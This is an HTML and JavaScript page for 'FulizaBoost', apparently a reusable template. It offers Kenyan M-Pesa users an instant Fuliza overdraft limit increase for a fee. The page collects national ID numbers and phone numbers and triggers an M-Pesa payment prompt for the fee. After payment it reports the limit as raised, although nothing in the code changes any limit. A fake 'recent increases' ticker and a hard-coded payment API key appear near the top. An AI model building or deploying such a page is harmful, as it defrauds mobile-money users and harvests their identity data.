<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>Boost Your Fuliza Limit | Get Instant Increase</title>

  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  
  <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.min.css" rel="stylesheet">

  <style>
    :root {
      --primary: #2563eb;
      --primary-dark: #1d4ed8;
      --secondary: #7c3aed;
      --accent: #f57c0b;
      --gradient-bg: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
      --card-bg: #ffffff;
      --text-dark: #1e293b;
      --text-muted: #64748b;
      --border-color: #cbd5e1;
      --shadow-sm: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03);
      --shadow-md: 0 10px 15px -3px rgba(0, 0, 0, 0.07), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
      --shadow-lg: 0 20px 25px -5px rgba(0, 0, 0, 0.08), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
      --radius: 16px;
      --radius-sm: 10px;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      -webkit-tap-highlight-color: transparent;
    }

    html {
      font-size: 14px;
    }

    body {
      font-family: 'Poppins', -apple-system, BlinkMacSystemFont, sans-serif;
      background: var(--gradient-bg);
      color: var(--text-dark);
      line-height: 1.5;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      padding: 12px;
      min-height: 100vh;
      overflow-x: hidden;
    }

    .container {
      max-width: 440px;
      margin: 0 auto;
    }

    /* Header */
    .header {
      text-align: center;
      margin-bottom: 20px;
      padding-top: 8px;
    }

    .logo {
      font-size: 1.8rem;
      font-weight: 800;
      background: linear-gradient(90deg, var(--primary) 0%, var(--secondary) 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      margin-bottom: 8px;
      line-height: 1.2;
      position: relative;
      display: inline-block;
    }

    .subtitle {
      color: var(--text-muted);
      font-size: 0.85rem;
      margin-bottom: 4px;
      line-height: 1.4;
      font-weight: 500;
    }

    /* Info Box */
    .info-box {
      background: linear-gradient(135deg, #eff6ff 0%, #dbeafe 100%);
      border-radius: var(--radius-sm);
      padding: 16px;
      margin-bottom: 16px;
      box-shadow: var(--shadow-sm);
      border-left: 4px solid var(--primary);
      text-align: center;
      font-size: 0.85rem;
      color: var(--text-muted);
    }

    /* Recent Loans Ticker */
    .recent-loans {
      background: linear-gradient(135deg, rgba(37, 99, 235, 0.08) 0%, rgba(124, 58, 237, 0.05) 100%);
      border-radius: var(--radius-sm);
      padding: 14px;
      margin-bottom: 20px;
      display: flex;
      align-items: flex-start;
      gap: 12px;
      border: 1px solid rgba(37, 99, 235, 0.1);
    }

    .recent-content strong {
      color: var(--primary);
      font-weight: 700;
      font-size: 0.9rem;
      display: block;
    }

    /* Main Card */
    .card {
      background: var(--card-bg);
      border-radius: var(--radius);
      padding: 20px;
      box-shadow: var(--shadow-md);
      margin-bottom: 20px;
      border: 1px solid rgba(203, 213, 225, 0.3);
    }

    /* Progress Bar */
    .progress {
      height: 8px;
      border-radius: 4px;
      overflow: hidden;
      display: flex;
      margin-bottom: 24px;
      background: #e2e8f0;
    }

    .progress .step-3 { 
      width: 100%;
      background: linear-gradient(90deg, var(--primary) 0%, var(--secondary) 100%);
    }

    /* Title */
    .title {
      display: flex;
      align-items: center;
      gap: 12px;
      font-size: 1.3rem;
      font-weight: 700;
      color: var(--text-dark);
      margin-bottom: 20px;
      padding-bottom: 12px;
      border-bottom: 2px solid #f1f5f9;
    }

    /* Loan Grid */
    .grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 12px;
      margin-bottom: 24px;
    }

    .loan-box {
      background: #ffffff;
      border: 2px solid var(--border-color);
      border-radius: var(--radius-sm);
      padding: 16px 12px;
      text-align: center;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .loan-box.selected {
      border-color: var(--primary);
      background: #eff6ff;
      transform: translateY(-2px);
    }

    .amount {
      font-size: 1.2rem;
      font-weight: 800;
      color: var(--primary);
      margin-bottom: 8px;
    }

    .fee {
      display: inline-block;
      padding: 4px 10px;
      background: #f1f5f9;
      border-radius: 20px;
      font-size: 0.8rem;
      font-weight: 600;
      color: var(--text-muted);
    }

    .loan-box.selected .fee {
      background: var(--primary);
      color: white;
    }

    /* CTA Button */
    .cta {
      background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
      border-radius: 14px;
      padding: 18px;
      text-align: center;
      color: #fff;
      font-size: 1.05rem;
      font-weight: 700;
      cursor: pointer;
      border: none;
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .cta.disabled {
      opacity: 0.6;
      cursor: not-allowed;
      background: #94a3b8;
    }

    /* Input Modal Styles */
    .input-wrapper { margin-bottom: 15px; text-align: left; }
    .input-label { display: block; font-weight: 600; margin-bottom: 5px; color: var(--primary); }
    .input-field, .phone-input-field { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; }
    .phone-input-with-prefix { display: flex; border: 2px solid #ddd; border-radius: 8px; overflow: hidden; }
    .phone-prefix { background: #eee; padding: 12px; font-weight: 700; border-right: 2px solid #ddd; }
    .phone-input-field { border: none; }
  </style>
</head>
<body>

  <div class="container">
    <div class="header">
      <div class="logo">FulizaBoost</div>
      <p class="subtitle">Instant Limit Increase â€¢ No Paperwork</p>
    </div>

    <div class="info-box">
      <i class="fas fa-rocket"></i> Choose your new limit to get started.
    </div>

    <div class="recent-loans">
      <i class="fas fa-chart-line"></i>
      <div class="recent-content">
        <strong>Recent increases</strong>
        <span id="ticker-text">0725****89 increased to Ksh 18,000 - just now</span>
      </div>
    </div>

    <div class="card">
      <div class="progress"><div class="step-3"></div></div>
      <div class="title"><i class="fas fa-bolt"></i> Select Your Fuliza Limit</div>
      <div class="grid" id="loan-grid"></div>
      <button class="cta disabled" id="get-limit-btn" disabled>
        <i class="fas fa-rocket"></i> Get Limit Now
      </button>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>

  <script>
    // 1. CONFIGURATION (REPLACE WITH YOUR DETAILS)
    const LIPIA_CONFIG = {
      apiKey: "fbe8f7b7b8f124e87be00987a4ae2891ee738557", // <--- PASTE API KEY HERE
      shortCode: "4717390",          // <--- PASTE TILL/PAYBILL HERE
      callbackUrl: "https://fulizaboost-five.vercel.app/callback"
    };

    const loanOptions = [
      { amount: 5000, fee: 49 }, { amount: 7500, fee: 75 },
      { amount: 10000, fee: 100 }, { amount: 12500, fee: 120 },
      { amount: 16000, fee: 150 }, { amount: 21000, fee: 200 },
      { amount: 25500, fee: 250 }, { amount: 30000, fee: 290 },
      { amount: 35000, fee: 340 }, { amount: 40000, fee: 410 },
      { amount: 45000, fee: 480 }, { amount: 50000, fee: 530 }
    ];

    let selectedLoan = null;
    let phoneNumber = '';
    let isProcessing = false;

    const loanGrid = document.getElementById('loan-grid');
    const getLimitBtn = document.getElementById('get-limit-btn');

    // Initialize UI
    function init() {
      loanOptions.forEach(loan => {
        const box = document.createElement('div');
        box.className = 'loan-box';
        box.innerHTML = `<div class="amount">Ksh ${loan.amount.toLocaleString()}</div><div class="fee">Fee: Ksh ${loan.fee}</div>`;
        box.onclick = () => {
          document.querySelectorAll('.loan-box').forEach(b => b.classList.remove('selected'));
          box.classList.add('selected');
          selectedLoan = loan;
          getLimitBtn.classList.remove('disabled');
          getLimitBtn.disabled = false;
          getLimitBtn.innerHTML = `<i class="fas fa-rocket"></i> Get Ksh ${loan.amount.toLocaleString()} Now`;
        };
        loanGrid.appendChild(box);
      });
    }

    // Step 1: Show ID & Phone Modal
    getLimitBtn.onclick = async () => {
      const { value: formValues } = await Swal.fire({
        title: 'Enter Details',
        html: `
          <div class="input-wrapper">
            <label class="input-label">ID Number</label>
            <input id="swal-id" class="input-field" type="number" placeholder="ID Number">
          </div>
          <div class="input-wrapper">
            <label class="input-label">M-Pesa Number</label>
            <div class="phone-input-with-prefix">
              <div class="phone-prefix">+254</div>
              <input id="swal-phone" class="phone-input-field" type="number" placeholder="712345678">
            </div>
          </div>`,
        showCancelButton: true,
        preConfirm: () => {
          const id = document.getElementById('swal-id').value;
          const phone = document.getElementById('swal-phone').value;
          if (!id || phone.length !== 9) {
            Swal.showValidationMessage('Enter a valid ID and 9-digit phone number');
            return false;
          }
          return { id, phone };
        }
      });

      if (formValues) {
        phoneNumber = "254" + formValues.phone;
        initiatePayment(formValues.id);
      }
    };

    // Step 2: Call Local API for Payment Initiation
    async function initiatePayment(idNumber) {
      if (isProcessing) return;
      isProcessing = true;
      
      Swal.fire({
        title: 'Sending STK Push...',
        text: 'Please check your phone for the M-Pesa prompt',
        allowOutsideClick: false,
        didOpen: () => Swal.showLoading()
      });

      try {
        const response = await fetch('/api/initiate-payment', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            phone_number: phoneNumber,
            amount: selectedLoan.fee,
            loan_amount: selectedLoan.amount,
            id_number: idNumber
          })
        });

        const result = await response.json();

        if (result.success) {
          // Start payment verification
          checkPaymentStatus(result.reference);
        } else {
          throw new Error(result.error || 'Payment initiation failed');
        }
      } catch (error) {
        Swal.fire({ icon: 'error', title: 'Error', text: error.message });
        isProcessing = false;
      }
    }

    // Step 3: Check Payment Status
    async function checkPaymentStatus(reference) {
      Swal.fire({
        title: 'Verifying Payment...',
        text: 'Please wait while we confirm your payment.',
        allowOutsideClick: false,
        didOpen: () => Swal.showLoading()
      });

      let attempts = 0;
      const maxAttempts = 20;
      const interval = setInterval(async () => {
        attempts++;
        try {
          const response = await fetch(`/api/verify-payment?reference=${reference}`);
          const result = await response.json();

          if (result.success && result.status === 'completed') {
            clearInterval(interval);
            Swal.fire({
              icon: 'success',
              title: 'Payment Successful!',
              text: `Your Fuliza limit has been increased to Ksh ${selectedLoan.amount.toLocaleString()}!`
            }).then(() => location.reload());
          } else if (result.status === 'failed' || result.status === 'cancelled' || attempts >= maxAttempts) {
            clearInterval(interval);
            Swal.fire({
              icon: 'error',
              title: 'Payment Failed',
              text: 'The payment was not completed. Please try again.'
            });
          }
          // If pending, continue polling
        } catch (error) {
          if (attempts >= maxAttempts) {
            clearInterval(interval);
            Swal.fire({ icon: 'error', title: 'Error', text: 'Unable to verify payment status.' });
          }
        }
      }, 3000); // Check every 3 seconds
    }

    init();
  </script>
</body>
</html>
